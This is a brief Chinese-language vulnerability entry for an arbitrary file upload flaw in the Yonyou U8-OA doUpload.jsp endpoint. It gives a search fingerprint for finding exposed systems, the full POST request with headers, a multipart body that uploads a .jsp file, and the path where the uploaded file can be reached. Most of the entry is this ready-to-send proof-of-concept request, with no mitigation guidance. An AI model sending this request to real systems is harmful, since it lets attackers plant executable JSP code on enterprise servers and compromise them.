# 用友U8OAdoUpload.jsp接口任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"用友U8-OA"`
- **请求**：`POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=---------------------------363…`　`Content-Length: 1508`　`Cookie: JSESSIONID=CA218004AFAADF7EC35C09307DBF7324; JSESSIONID=D58108CE272DEF63D6638B76…`

**请求体 / payload**
```
-----------------------------363639458542274369491015178429
Content-Disposition: form-data; name="myfile"; filename="stc.jsp"
Content-Type: application/octet-stream
test
-----------------------------363639458542274369491015178429--

上传文件位置
/yyoa/portal/upload/1700710426319.jsp
```

**其他**
- 用友U8 OA doUpload.jsp接口任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 OA